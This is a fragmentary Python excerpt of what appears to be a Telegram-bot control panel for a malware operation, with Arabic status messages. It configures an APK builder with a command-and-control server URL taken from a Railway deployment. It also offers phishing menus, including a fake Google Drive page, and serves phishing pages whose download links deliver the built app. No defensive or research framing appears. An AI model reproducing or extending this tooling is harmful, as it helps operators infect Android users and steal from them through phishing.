...
try:
    from builder_engine.apk_builder import APKBuilder
    def build_apk_internal(config):
        builder = APKBuilder()
...
async def build_start_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    config['c2_server'] = current_c2_url or os.environ.get('RAILWAY_PUBLIC_DOMAIN')
    
    if not config.get('c2_server'):
        await query.edit_message_text("❌ لم يتم العثور على رابط السيرفر. تأكد من النشر على Railway.")
        return
...
async def phish_menu_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    server_domain = current_c2_url or os.environ.get('RAILWAY_PUBLIC_DOMAIN', 'localhost:5000')
...
async def phish_gdrive_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    if not domain.startswith('http'):
        protocol = 'https' if 'railway.app' in domain else 'http'
...
async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    elif data in ("refresh", "main_menu"):
...
async def tunnel_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    if railway_domain:
        current_c2_url = railway_domain
        await update.message.reply_text(f"✅ تم تفعيل رابط Railway!\n🔗 `{current_c2_url}`", parse_mode='Markdown')
    else:
        await update.message.reply_text("❌ لم يتم العثور على رابط Railway. تأكد من النشر على Railway.")
...
def serve_phishing_page(page_id):
    ...
    protocol = 'https' if 'railway.app' in server_domain else 'http'
    download_url = f"{protocol}://{server_domain}/phish/{page_id}/download"
    html = html.replace('{{DOWNLOAD_URL}}', download_url).replace('{{PAGE_ID}}', page_id)
